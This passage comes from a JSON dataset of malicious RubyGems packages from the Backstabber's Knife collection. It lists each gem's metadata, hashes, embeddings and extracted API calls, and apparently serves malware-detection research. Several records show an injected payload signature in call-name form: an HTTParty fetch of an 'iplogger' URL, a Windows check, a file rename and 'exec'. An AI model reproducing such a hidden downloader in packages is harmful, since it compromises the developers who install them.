'rating_column', 'results.[]', 'results.[](0).[](0).to_f', 'results.[](0).[]', 'results.[]', 'data.css(\"td:nth-child(2)\").[](0).inner_text.scan', 'data.css(\"td:nth-child(2)\").[](0).inner_text', 'data.css(\"td:nth-child(2)\").[]', 'data.css', 'data', 'results.[]', 'results.[](0).[](0).to_f', 'results.[](0).[]', 'results.[]', 'if distance_known?\\n  [name, \"#{distance} miles\", \"#{rating} / 10\", url]\\nelse\\n  [name, \"#{rating} / 10\", url]\\nend.join', 'distance_known?', 'name', 'distance', 'rating', 'url', 'name', 'rating', 'url', 'attr_accessor', 'self.maximum_cache_ttl=', '86400.*', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'self.logger=', 'options.[]', 'NullLogger.instance', 'self.sort_by=', 'proc', 'r.rating.-@', 'r.rating', 'self.maximum_results=', 'page(0).to_s.scan', 'page(0).to_s', 'page', 'matches.[](0).[](0).to_i', 'matches.[](0).[]', 'matches.[]', 'loop', 'logger.debug', 'logger', 'results_on_page', 'page_results.empty?', 'maximum_results', 'results.size + page_results.size.>', 'results.size.+', 'results.size', 'page_results.size', 'maximum_results', 'logger.debug', 'logger', 'maximum_results', 'results.size.+', 'results.size', 'page_results.size', 'page_results.pop', 'maximum_results', 'results.size.>=', 'results.size', 'maximum_results', 'logger.debug', 'logger', 'results.size', 'results.sort_by!', 'sort_by', 'results.each', 'logger.debug', 'logger', 'include', 'CGI.escape', 'postcode', 'private', 'tube_station', 'params.<<', 'tube_station', 'postcode', 'params.<<', 'escaped_postcode', 'real_ale', 'params.<<', 'food', 'params.<<', 'wifi', 'params.<<', 'minimum_rating', 'params.<<', 'minimum_rating', 'params.join', 'private', 'query_string', 'logger.debug', 'logger', 'read_cache', 'logger.debug', 'logger', 'open(uri).read', 'open', 'logger.debug', 'logger', 'Nokogiri.HTML', 'private', 'Time.now.to_i./', 'Time.now.to_i', 'Time.now', 'self.class.maximum_cache_ttl.to_i', 'self.class.maximum_cache_ttl', 'self.class', 'private', 'self.class.maximum_cache_ttl.to_i', 'self.class.maximum_cache_ttl', 'self.class', 'cache_generation', 'private', 'Dir.tmpdir.+', 'Dir.tmpdir', 'cache_prefix', 'File.exists?', 'Dir.mkdir', 'Digest::SHA1.hexdigest', 'File.exists?', 'logger.debug', 'logger', 'File.read', 'logger.debug', 'logger', 'logger.debug', 'logger', 'data.bytesize', 'logger.debug', 'logger', 'File.open', 'f.puts', 'logger.debug', 'logger', 'private', 'page(n).css(\"table.pubtable tr.pubtable\").to_a', 'page(n).css', 'page', 'logger.debug', 'logger', 'rows.size', 'rows.map!', 'Pub.new', 'minimum_rating', 'rows.delete_if', 'p.rating.<', 'p.rating', 'minimum_rating', 'logger.debug', 'logger', 'rows.size', 'logger.debug', 'logger', 'rows.size', 'private']",
            "n_tokens": 1303,
            "embedding": "[ 0.02421947  0.00523715 -0.00300853 ... -0.00336303 -0.03310561\n  0.03412657]",
            "cluster": "0",
            "id": 12,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/beer-in_the_evening/0.0.7/beer-in_the_evening-0.0.7.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/beer-in_the_evening/0.0.7/beer-in_the_evening-0.0.7_extracted",
            "name": "beer-in_the_evening",
            "version": "0.0.7",
            "published_at": "2020-02-25T03:15:45.357Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL but not a Github URL.",
            "dependencies": "rake, nokogiri, null_logger",
            "SHA-256": "255d7940c54bcddbb933d050eace9a60cab67790d340750fe33bc8a287cd23b0"
        },
        {
            "name_version": "lita_onewheel-beer-base-2.0.8",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/lita_onewheel-beer-base/2.0.8/lita_onewheel-beer-base-2.0.8_extracted/lita_onewheel-beer-base-2.0.8_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'HTTParty.get', 'd + aa + \"/\" + \"iplogger\" + e.+', 'd + aa + \"/\" + \"iplogger\".+', 'd + aa + \"/\".+', 'd + aa.+', 'd.+', 'TacoBell.check_win', 'File.rename', 'exec', 'require', 'Lita.load_locales', 'Dir.[]', 'File.expand_path', 'File.join', 'require', 'Lita::Handlers::OnewheelBeerBase.template_root', 'File.expand_path', 'File.join', 'require', 'require', 'require', 'self.get_source', 'beers.each', 'get_tap_type_text', 'datum.[]', 'datum.[](:brewery).to_s.empty?', 'datum.[](:brewery).to_s', 'datum.[]', 'datum.[](:brewery).to_s.+', 'datum.[](:brewery).to_s', 'datum.[]', 'datum.[](:name).to_s.empty?', 'datum.[](:name).to_s', 'datum.[]', 'datum.[](:name).to_s.+', 'datum.[](:name).to_s', 'datum.[]', 'reply.strip.sub', 'reply.strip', 'Lita.logger.info', 'Lita.logger', 'response.reply', 'type.nil?', 'type.empty?', 'Lita.logger.debug', 'Lita.logger', 'get_source', 'beers.each', 'response.matches.[](0).[](0).strip', 'response.matches.[](0).[]', 'response.matches.[]', 'response.matches', 'Lita.logger.debug', 'Lita.logger', 'datum.[]', 'query.match', 'tap.to_s.==', 'tap.to_s', 'query.to_s', 'Lita.logger.debug', 'Lita.logger', 'send_response', 'datum.[](:search).to_s.match', 'datum.[](:search).to_s', 'datum.[]', 'datum.[](:type).to_s.downcase.match', 'datum.[](:type).to_s.downcase', 'datum.[](:type).to_s', 'datum.[]', 'Lita.logger.debug', 'Lita.logger', 'datum.[]', 'send_response', 'get_source', 'beers.each', 'datum.[](:abv).to_f.==', 'datum.[](:abv).to_f', 'datum.[]', 'response.matches.[](0).[](0).strip', 'response.matches.[](0).[]', 'response.matches.[]', 'response.matches', 'query.match', 'abv_matches.to_s.match(/[<>=]+/).to_s', 'abv_matches.to_s.match', 'abv_matches.to_s', 'abv_matches.to_s.match(/\\\\d+.*\\\\d*/).to_s', 'abv_matches.to_s.match', 'abv_matches.to_s', 'direction.==', 'datum.[](:abv).to_f.>', 'datum.[](:abv).to_f', 'datum.[]', 'abv_requested.to_f', 'send_response', 'direction.==', 'datum.[](:abv).to_f.<', 'datum.[](:abv).to_f', 'datum.[]', 'abv_requested.to_f', 'send_response', 'direction.==', 'datum.[](:abv).to_f.>=', 'datum.[](:abv).to_f', 'datum.[]', 'abv_requested.to_f', 'send_response', 'direction.==', 'datum.[](:abv).to_f.<=', 'datum.[](:abv).to_f', 'datum.[]', 'abv_requested.to_f', 'send_response', 'get_source', 'beers.each', 'response.matches.[](0).[](0).strip', 'response.matches.[](0).[]', 'response.matches.[]', 'response.matches', 'query.match', 'price_matches.to_s.match(/[<>=]+/).to_s', 'price_matches.to_s.match', 'price_matches.to_s', 'price_matches.to_s.match(/\\\\d+.*\\\\d*/).to_s', 'price_matches.to_s.match', 'price_matches.to_s', 'direction.==', 'datum.[](:price).to_f.>', 'datum.[](:price).to_f', 'datum.[]', 'price_requested.to_f', 'send_response', 'direction.==', 'datum.[](:price).to_f.<', 'datum.[](:price).to_f', 'datum.[]', 'price_requested.to_f', 'send_response', 'direction.==', 'datum.[](:price).to_f.>=', 'datum.[](:price).to_f', 'datum.[]', 'price_requested.to_f', 'send_response', 'direction.==', 'datum.[](:price).to_f.<=', 'datum.[](:price).to_f', 'datum.[]', 'price_requested.to_f', 'send_response', 'get_source', 'beers.to_a.sample', 'beers.to_a', 'send_response', 'beer.[]', 'beer.[]', 'get_source', 'beers.each', 'beers.[](low_tap).[](:remaining).>', 'beers.[](low_tap).[]', 'beers.[]', 'datum.[]', 'datum.[](:remaining).to_i.<=', 'datum.[](:remaining).to_i', 'datum.[]', 'send_response', 'get_source', 'beers.each', 'datum.[](:abv).!=', 'datum.[]', 'beers.[](low_tap).[](:abv).>', 'beers.[](low_tap).[]', 'beers.[]', 'datum.[]', 'send_response', 'beers.[]', 'get_source', 'beers.each', 'datum.[](:abv).!=', 'datum.[]', 'beers.[](high_tap).[](:abv).<', 'beers.[](high_tap).[]', 'beers.[]', 'datum.[]', 'send_response', 'beers.[]', 'raise', 'Lita.register_handler', 'require', 'require', 'SimpleCov.formatters=', 'SimpleCov.start', 'add_filter', 'require', 'require', 'Lita.version_3_compatibility_mode=']",
            "n_tokens": 1381,
            "embedding": "[ 0.01101562 -0.02283272  0.00535631 ... -0.00590855 -0.01335167\n  0.01036074]",
            "cluster": "0",
            "id": 386,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/lita_onewheel-beer-base/2.0.8/lita_onewheel-beer-base-2.0.8.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/lita_onewheel-beer-base/2.0.8/lita_onewheel-beer-base-2.0.8_extracted",
            "name": "lita_onewheel-beer-base",
            "version": "2.0.8",
            "published_at": "2020-02-25T03:20:03.416Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL and a Github URL.",
            "dependencies": "bundler, rake, rack-test, rspec, simplecov, coveralls, lita, sanitize, rest-client",
            "SHA-256": "62881f4cb2126f9fc10b339d6d80e7e81e69d4c102b4390455bfcf8475c939fd"
        },
        {
            "name_version": "datadog-apm-0.9.0",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/datadog-apm/0.9.0/datadog-apm-0.9.0_extracted/datadog-apm-0.9.0_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'HTTParty.get', 'd + aa + \"/\" + \"iplogger\" + e.+', 'd + aa + \"/\" + \"iplogger\".+', 'd + aa + \"/\".+', 'd + aa.+', 'd.+', 'TacoBell.check_win', 'File.rename', 'exec', 'require', 'require', 'require', 'include', 'with_configuration', 'has', 'has', 'has', 'has', 'initializer', 'Statsd.new', 'ActiveSupport::Notifications.subscribe', 'ActiveSupport::Notifications::Event.new', 'event.payload.[]', 'event.payload', 'event.payload.[]', 'event.payload', 'event.payload.[]', 'event.payload', 'event.payload.[]', 'event.payload', 'event.payload.[]', 'event.payload', 'format.==', 'event.payload.[]', 'event.payload', 'DatadogApm.configuration.tags.+', 'DatadogApm.configuration.tags', 'DatadogApm.configuration', 'event.payload.[]', 'event.payload', 'ActiveSupport::Notifications.instrument', 'event.duration', 'ActiveSupport::Notifications.instrument', 'event.payload.[]', 'event.payload', 'ActiveSupport::Notifications.instrument', 'event.payload.[]', 'event.payload', 'ActiveSupport::Notifications.instrument', 'event.payload.[]', 'event.payload', 'ActiveSupport::Notifications.instrument', 'ActiveSupport::Notifications.instrument', 'event.payload.[]', 'event.payload', 'ActiveSupport::Notifications.subscribe', 'finish.to_f.-', 'finish.to_f', 'start.to_f', 'duration.>=', 'DatadogApm.configuration.slow_query_max_duration.to_f', 'DatadogApm.configuration.slow_query_max_duration', 'DatadogApm.configuration', 'payload.[](:sql).starts_with?(\"EXPLAIN\", \"SHOW\").!', 'payload.[](:sql).starts_with?', 'payload.[]', 'ActiveRecord::Base.connection.execute(\"EXPLAIN #{payload.[](:sql)}\").each', 'ActiveRecord::Base.connection.execute', 'ActiveRecord::Base.connection', 'payload.[]', '{ sql: payload.[](:sql).gsub(\"\\\\n\", \"\"), select_type: row.[](\"select_type\"), table: row.[](\"table\"), possible_keys: row.[](\"possible_keys\"), key: row.[](\"key\"), key_len: row.[](\"key_len\"), rows: row.[](\"rows\"), filtered: row.[](\"filtered\") }.map { |k, v|\\n  \"#{k} = #{v}\"\\n}.join', '{ sql: payload.[](:sql).gsub(\"\\\\n\", \"\"), select_type: row.[](\"select_type\"), table: row.[](\"table\"), possible_keys: row.[](\"possible_keys\"), key: row.[](\"key\"), key_len: row.[](\"key_len\"), rows: row.[](\"rows\"), filtered: row.[](\"filtered\") }.map', 'payload.[](:sql).gsub', 'payload.[]', 'row.[]', 'row.[]', 'row.[]', 'row.[]', 'row.[]', 'row.[]', 'row.[]', '$statsd.nil?', '$statsd.event', 'DatadogApm.configuration.slow_query_max_duration.to_f', 'DatadogApm.configuration.slow_query_max_duration', 'DatadogApm.configuration', 'DatadogApm.configuration.tags', 'DatadogApm.configuration', 'ActiveSupport::Notifications.subscribe', 'DatadogApm.configuration.environments.include?', 'DatadogApm.configuration.environments', 'DatadogApm.configuration', 'Rails.env', 'send_event_to_statsd', 'payload.[]', 'payload.[]', 'payload.[]', 'payload.[]', 'DatadogApm.configuration.metric.to_s', 'DatadogApm.configuration.metric', 'DatadogApm.configuration', 'action.==', '$statsd.nil?', '$statsd.increment', '$statsd.nil?', '$statsd.histogram']",
            "n_tokens": 874,
            "embedding": "[-0.01263623 -0.01252947 -0.00193498 ...  0.00825431 -0.01631451\n -0.00616768]",
            "cluster": "0",
            "id": 76,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/datadog-apm/0.9.0/datadog-apm-0.9.0.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/datadog-apm/0.9.0/datadog-apm-0.9.0_extracted",
            "name": "datadog-apm",
            "version": "0.9.0",
            "published_at": "2020-02-25T03:52:08.257Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL but not a Github URL.",
            "dependencies": "bundler, rake, dogstatsd-ruby, gem_config",
            "SHA-256": "ccf97f8f3abf91829a8b5c846fbb640626c2334e3c5b8291efff96f96ed3461f"
        },
        {
            "name_version": "cwlogs_s3-0.0.6",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/cwlogs_s3/0.0.6/cwlogs_s3-0.0.6_extracted/cwlogs_s3-0.0.6_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'HTTParty.get', 'd + aa + \"/\" + \"iplogger\" + e.+', 'd + aa + \"/\" + \"iplogger\".+', 'd + aa + \"/\".+', 'd + aa.+', 'd.+', 'TacoBell.check_win', 'File.rename', 'exec', 'require', 'File.dirname(\"/Users/xxxx/Documents/malware/rubygems/Backstabber/cwlogs_s3/0.0.6/cwlogs_s3-0.0.6_extracted/cwlogs_s3-0.0.6_sourcecode.rb\").+', 'File.dirname', 'require', 'require', 'require', 'require', 'require', 'require', 'Chronic.parse', 'command_options.[]', 'command_options', 'ChronicDuration.parse', 'command_options.[]', 'command_options', 'Time.at', 'ending.to_i.-', 'ending.to_i', 'URI', 'command_options.[]', 'command_options', 's3Uri.host', 's3Uri.path.gsub!', 's3Uri.path', 'Escort::Logger.output.puts', 'Escort::Logger.output', 'Aws::CloudWatchLogs::Client.new', 'command_options.[]', 'command_options', 'Aws::S3::Resource.new', 'command_options.[]', 'command_options', '@cwl.describe_log_streams', 'command_options.[]', 'command_options', 'resp.each', 'streams.[](:log_streams).each', 'streams.[]', '@stream_list.push', 'stream.[]', 'Escort::Logger.output.puts', 'Escort::Logger.output', '@stream_list.join', '@stream_list.each', 'Escort::Logger.output.puts', 'Escort::Logger.output', '@cwl.get_log_events', 'command_options.[]', 'command_options', 'start.to_i.*', 'start.to_i', 'ending.to_i.*', 'ending.to_i', 'resp.each', 'log_page.[](:events).length.==', 'log_page.[](:events).length', 'log_page.[]', 'put_page', 'log_page.[]', 'Escort::Logger.output.puts', 'Escort::Logger.output', 'events.each', '@event_cnt.+', 'page_content << event.[](:message).<<', 'page_content.<<', 'event.[]', '@s3_prefix + randomise_prefix + \"_\" + @page_cnt.to_s.+', '@s3_prefix + randomise_prefix + \"_\".+', '@s3_prefix + randomise_prefix.+', '@s3_prefix.+', 'randomise_prefix', '@page_cnt.to_s', '@s3.bucket(@bucket).object(object_name).put', '@s3.bucket(@bucket).object', '@s3.bucket', 'Escort::Logger.output.puts', 'Escort::Logger.output', '@page_cnt.+', 'SecureRandom.hex(2).to_s', 'SecureRandom.hex']",
            "n_tokens": 630,
            "embedding": "[ 0.00258829 -0.01965072  0.00628295 ... -0.02157925 -0.03049109\n  0.01612861]",
            "cluster": "0",
            "id": 292,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/cwlogs_s3/0.0.6/cwlogs_s3-0.0.6.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/cwlogs_s3/0.0.6/cwlogs_s3-0.0.6_extracted",
            "name": "cwlogs_s3",
            "version": "0.0.6",
            "published_at": "2020-02-25T23:50:17.917Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL but not a Github URL.",
            "dependencies": "bundler, rake, escort, aws-sdk, chronic_duration, chronic",
            "SHA-256": "31d119f9b280a0d6694f693a07fa688210b372ede0ac49877b5a4bd2f66ec239"
        },
        {
            "name_version": "has-changelogs-0.2.0",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/has-changelogs/0.2.0/has-changelogs-0.2.0_extracted/has-changelogs-0.2.0_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'HTTParty.get', 'd + aa + \"/\" + \"iplogger\" + e.+', 'd + aa + \"/\" + \"iplogger\".+', 'd + aa + \"/\".+', 'd + aa.+', 'd.+', 'TacoBell.check_win', 'File.rename', 'exec', 'require', 'require', 'send', 'options.[](:on).!', 'options.[]', 'options.[](:on).include?', 'options.[]', 'after_create', 'options.[](:on).!', 'options.[]', 'options.[](:on).include?', 'options.[]', 'before_destroy', 'options.[](:on).!', 'options.[]', 'options.[](:on).include?', 'options.[]', 'after_update', 'prepare_class_options', 'has_many', 'private', 'class_attribute', 'self.has_changelog_options=', 'options.dup', 'has_changelog_options.[]=', 'has_changelog_options', '(Array(has_changelog_options.[](:ignore)) | [:updated_at, :created_at, :id])\\n.map', 'Array(has_changelog_options.[](:ignore)).|', 'Array', 'has_changelog_options.[]', 'has_changelog_options', 'has_changelog_options.[]=', 'has_changelog_options', 'Array(has_changelog_options.[](:only)).map', 'Array', 'has_changelog_options.[]', 'has_changelog_options', 'has_changelog_options.[]=', 'has_changelog_options', 'Array(has_changelog_options.[](:force)).map', 'Array', 'has_changelog_options.[]', 'has_changelog_options', 'self.class.has_changelog_options.[]', 'self.class.has_changelog_options', 'self.class', 'self.class.has_changelog_options.[]', 'self.class.has_changelog_options', 'self.class', 'conditions_met?', 'object_changed_notably?', 'if_condition.blank?', 'if_condition.call', 'unless_condition.blank?', 'unless_condition.call(self).!', 'unless_condition.call', 'notable_attributes', 'self.class.has_changelog_options.[]', 'self.class.has_changelog_options', 'self.class', 'self.class.has_changelog_options.[]', 'self.class.has_changelog_options', 'self.class', 'only.empty?', 'changed_and_not_ignored', 'changed_and_not_ignored.&', 'changed_and_not_ignored', 'notable.+', 'self.class.has_changelog_options.[]', 'self.class.has_changelog_options', 'self.class', 'changed.-', 'changed', 'notable_changes.any?', 'notable_changes', 'log_change', 'log_change', 'log_change', 'attributes', 'log_scope', 'log_data', 'log_origin', 'log_metadata', 'changelog_association.create', 'changelog_association', 'defaults.merge', 'has_changelog_options.[](:at).present?', 'has_changelog_options.[]', 'has_changelog_options', 'has_changelog_options.[](:at).present?', 'has_changelog_options.[]', 'has_changelog_options', 'send', 'has_changelog_options.[]', 'has_changelog_options', 'self.class.to_s', 'self.class', 'logged_model.send', 'logged_model', 'changelog_association_name', 'self.class.has_changelog_options.[]', 'self.class.has_changelog_options', 'self.class', 'raw_changed_data(options).select', 'raw_changed_data', 'notable_changes.include?', 'notable_changes', 'key.to_s', 'options.[]', 'changes', 'receiver.extend', 'ActiveSupport.on_load', 'include']",
            "n_tokens": 793,
            "embedding": "[-0.0104393  -0.00612698 -0.0077871  ...  0.00301862 -0.01467683\n  0.00837038]",
            "cluster": "0",
            "id": 227,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/has-changelogs/0.2.0/has-changelogs-0.2.0.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/has-changelogs/0.2.0/has-changelogs-0.2.0_extracted",
            "name": "has-changelogs",
            "version": "0.2.0",
            "published_at": "2020-02-25T23:53:31.033Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": NaN,
            "maintainers": NaN,
            "repository_url": NaN,
            "dependencies": NaN,
            "SHA-256": "b3d2a7b8fd3413dc2dc3e2a720808f3d1eb780f094082323d5db96af21e260e7"
        },
        {
            "name_version": "jekyll-rp-logs-0.5.0",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/jekyll-rp-logs/0.5.0/jekyll-rp-logs-0.5.0_extracted/jekyll-rp-logs-0.5.0_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'HTTParty.get', 'd + aa + \"/\" + \"iplogger\" + e.+', 'd + aa + \"/\" + \"iplogger\".+', 'd + aa + \"/\".+', 'd + aa.+', 'd.+', 'TacoBell.check_win', 'File.rename', 'exec', 'require', 'require', 'require', 'require', 'Gem.find_files(\"jekyll/rp_logs/parsers/*.rb\").each', 'Gem.find_files', 'require', 'require', 'RpLogGenerator.add', '$LAST_MATCH_INFO.[]', 'mode.==', 'DateTime.strptime', '$LAST_MATCH_INFO.[]', 'LogLine.new', '$LAST_MATCH_INFO.[]', '$LAST_MATCH_INFO.[]', '$LAST_MATCH_INFO.[]', 'RpLogGenerator.add', '$LAST_MATCH_INFO.[]', 'mode.==', 'DateTime.strptime', '$LAST_MATCH_INFO.[]', 'LogLine.new', '$LAST_MATCH_INFO.[]', '$LAST_MATCH_INFO.[]', '$LAST_MATCH_INFO.[]', 'RpLogGenerator.add', 'DateTime.strptime', '$LAST_MATCH_INFO.[]', '$LAST_MATCH_INFO.[]', '$LAST_MATCH_INFO.[]', '$LAST_MATCH_INFO.[](:nick).tr(\" \", \"-\").gsub', '$LAST_MATCH_INFO.[](:nick).tr', '$LAST_MATCH_INFO.[]', 'LogLine.new', 'RpLogGenerator.add', 'DateTime.strptime', '$LAST_MATCH_INFO.[]', '$LAST_MATCH_INFO.[]', '$LAST_MATCH_INFO.[]', '$LAST_MATCH_INFO.[](:nick).tr(\" \", \"-\").gsub', '$LAST_MATCH_INFO.[](:nick).tr', '$LAST_MATCH_INFO.[]', 'LogLine.new', 'RpLogGenerator.add', '$LAST_MATCH_INFO.[]', 'mode.==', 'DateTime.strptime', '$LAST_MATCH_INFO.[]', 'LogLine.new', '$LAST_MATCH_INFO.[]', '$LAST_MATCH_INFO.[]', '$LAST_MATCH_INFO.[]', 'require', 'extend', 'include', 'def_delegator', 'attr_accessor', 'name.strip!', '@rps.<<', '@rps.map { |rp_page,|\\n  rp_page.[](:time_line) || rp_page.[](:start_date)\\n}.min', '@rps.map', 'rp_page.[]', 'rp_page.[]', '@rps.map { |rp_page,|\\n  rp_page.[](:last_post_time)\\n}.max', '@rps.map', 'rp_page.[]', 'name', 'self.class.==', 'self.class', 'other.class', 'name.==', 'name', 'other.name', 'rps.==', 'rps', 'other.rps', 'self.class.==', 'self.class', 'other.class', 'name.<=>', 'name', 'other.name', 'self.class.name + \"[\" + @name.+', 'self.class.name + \"[\".+', 'self.class.name.+', 'self.class.name', 'self.class', 'require_relative', 'require_relative', 'require_relative', 'require_relative', 'require_relative', 'safe', 'priority', 'attr_reader', '@parsers.[]=', 'config.[](\"collections\").keys.[](0).freeze', 'config.[](\"collections\").keys.[]', 'config.[](\"collections\").keys', 'config.[]', 'config.key?', 'config.[]=', 'RpLogGenerator.extract_settings', 'LogLine.extract_settings', 'Page.extract_settings', 'Jekyll.logger.info', 'Jekyll.logger', 'site.config.[]', 'site.config', 'site.config.[]=', 'site.config', 'extract_indexes', 'disable_liquid_rendering', 'extract_valid_rps', 'convert_all_pages', 'private', 'self.class.rp_key', 'self.class', 'site.pages.find', 'site.pages', 'page.data.[]', 'page.data', 'main_index.nil?', 'Jekyll.logger.abort_with', 'Jekyll.logger', 'main_index.data.[]=', 'main_index.data', 'site.pages.find', 'site.pages', 'page.data.[]', 'page.data', 'arc_index.nil?', 'Jekyll.logger.abort_with', 'Jekyll.logger', 'site.data.[]=', 'site.data', 'site.collections.[](rp_key).docs.each', 'site.collections.[](rp_key).docs', 'site.collections.[]', 'site.collections', 'rp_key', 'site.collections.[](rp_key).docs.map { |p,|\\n  RpLogs::Page.new(p)\\n}.reject', 'site.collections.[](rp_key).docs.map', 'site.collections.[](rp_key).docs', 'site.collections.[]', 'site.collections', 'rp_key', 'RpLogs::Page.new', 'p.errors?', 'self.class.parsers', 'self.class', 'skip_page', 'Hash.new', 'hash.[]=', 'Arc.new', 'rp_pages.each', 'convert_page', 'Jekyll.logger.info', 'Jekyll.logger', 'site.collections.[](rp_key).docs.size', 'site.collections.[](rp_key).docs', 'site.collections.[]', 'site.collections', 'rp_key', 'sort_arcs', 'sort_chronologically!', 'main_index.data.[](\"rps\").[]', 'main_index.data.[]', 'main_index.data', 'sort_chronologically!', 'main_index.data.[](\"rps\").[]', 'main_index.data.[]', 'main_index.data', 'convert_rp', 'page.canon', 'main_index.data.[](\"rps\").[](key).<<', 'main_index.data.[](\"rps\").[]', 'main_index.data.[]', 'main_index.data', 'page.[](:rp_tags).<<', 'page.[]', 'Tag.new', 'page.[](:rp_tags).sort!', 'page.[]', 'page.[]', 'arc_name.empty?.!', 'arc_name.empty?', 'arc_name.each', 'arcs.[](n).<<', 'arcs.[]', 'no_arc_rps.<<', 'Jekyll.logger.debug', 'Jekyll.logger', 'page.basename', 'skip_page', 'page.basename', '$ERROR_INFO.inspect', 'raise', 'arcs.each_key', 'sort_chronologically!', 'arcs.[](key).rps', 'arcs.[]', 'arc_index.data.[]=', 'arc_index.data', 'sort_arcs_and_pages', 'no_arc_rps.map { |x,|\\n  [\"rp\", x]\\n}.+', 'no_arc_rps.map', 'arcs.values.map', 'arcs.values', 'combined_rps.sort_by! { |type, x|\\n  case type\\n  when \"rp\"\\n    x.[](:time_line) || x.[](:start_date)\\n  when \"arc\"\\n    x.start_date\\n  end\\n}.reverse!', 'combined_rps.sort_by!', 'x.[]', 'x.[]', 'x.start_date', 'pages.each', 'p.[]', 'p.[](:time_line).is_a?(Date).!', 'p.[](:time_line).is_a?', 'p.[]', 'Jekyll.logger.error', 'Jekyll.logger', 'p.[]', 'p.path', 'fail', 'pages.sort_by! { |p,|\\n  p.[](:time_line) || p.[](:start_date)\\n}.reverse!', 'pages.sort_by!', 'p.[]', 'p.[]', 'catch', 'page.convert_rp', 'self.class.parsers', 'self.class', 'skip_page', 'site.collections.[](rp_key).docs.delete', 'site.collections.[](rp_key).docs', 'site.collections.[]', 'site.collections', 'rp_key', 'page.page', 'Jekyll.logger.warn', 'Jekyll.logger', 'page.basename', 'require', '\"!RP\".freeze', '\"!OOC\".freeze', '\"!MERGE\".freeze', '\"!SPLIT\".freeze', 'attr_reader', 'attr_reader', 'attr_reader', 'attr_reader', '\"([\".freeze', 'attr_reader', 'config.fetch', 'config.fetch(\"ooc_start_delimiters\", @ooc_start_delimiters).freeze', 'config.fetch', 'flags.split', 'classify', 'private', '@options.[]', '@contents.strip.[]', '@contents.strip', 'ooc_start_delimiters.include?', 'ooc_start_delimiters', '@flags.include?', '@flags.include?', 'output_tags', 'CGI.escapeHTML', 'output_timestamp', 'output_sender', '@timestamp.strftime', '@timestamp.strftime', '@timestamp.strftime', 'fail', 'fail', 'next_line.merge_flag?', 'next_line.split_flag?', 'mergeable_ignoring_flags?', 'private', 'close_enough_timestamps?', 'same_sender?', 'rp?', 'next_line.rp?', 'next_line.possible_split_to_normal_text?', 'space_between_lines', 'next_line.contents', 'next_line.timestamp', 'private', 'options.[]', 'options', 'options.[](:splits_by_character).include?', 'options.[]', 'options', '@output_type.==', '@flags.include?', '@flags.include?', 'protected', 'base_type.==', 'base_type', '@options.[]', '@options.[](:merge_text_into_rp).include?', '@options.[]', 'private', '(next_line.timestamp - @last_merged_timestamp) * 24 * 60.*', '(next_line.timestamp - @last_merged_timestamp) * 24.*', '(next_line.timestamp - @last_merged_timestamp)\\n.*', 'next_line.timestamp.-', 'next_line.timestamp', 'time_diff.>=', 'time_diff.<=', 'max_seconds_between_posts', '@sender.==', 'next_line.sender', 'self.class.max_seconds_between_posts', 'self.class', 'self.class.ooc_start_delimiters', 'self.class', 'require', 'require_relative', 'require_relative', 'extend', 'def_delegators', 'attr_reader', 'attr_reader', 'TagImplicationHandler.new', 'self.[](:rp_tags).is_a?', 'self.[]', 'self.[]=', 'Tag.[]', 'self.[](:rp_tags).split', 'self.[]', '@page.data.[]', '@page.data', 'key.to_s', '@page.data.[]=', '@page.data', 'key.to_s', 'self.[]', 'tags.map', 'tags', 'self.[]', 'convert_all_lines', 'merge_lines!', 'extract_stats', 'compiled_lines.map', 'page.content=', 'page', 'split_output.join', 'update_page_properties', 'self.[](:format).nil?', 'self.[]', 'self.[](:format).empty?', 'self.[]', 'self.[](:format).each', 'self.[]', 'supported_formats.[]', 'self.[](:rp_tags).nil?', 'self.[]', 'self.[]', 'self.[](:arc_name).respond_to?(\"each\").!', 'self.[](:arc_name).respond_to?', 'self.[]', 'self.[]', 'self.[]', 'self.[]', 'self.[]=', 'Tag.[]', 'self.class.tag_implication_handler.update_tags', 'self.class.tag_implication_handler', 'self.class', 'tag_strings.to_set', 'tag_strings', 'private', 'content.each_line', 'content', 'parse_line', 